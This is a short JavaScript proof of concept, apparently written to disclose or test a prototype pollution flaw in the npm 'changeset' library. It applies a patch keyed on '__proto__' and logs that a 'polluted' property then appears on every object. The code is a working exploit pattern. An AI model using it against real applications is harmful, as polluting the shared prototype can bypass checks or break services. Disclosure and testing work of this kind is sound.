var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const changeset = require('changeset');
const patch = [{
        type: 'put',
        key: [
            '__proto__',
            'polluted'
        ],
        value: 'yes'
    }];
changeset.apply(patch, obj, true);
console.log({}.polluted);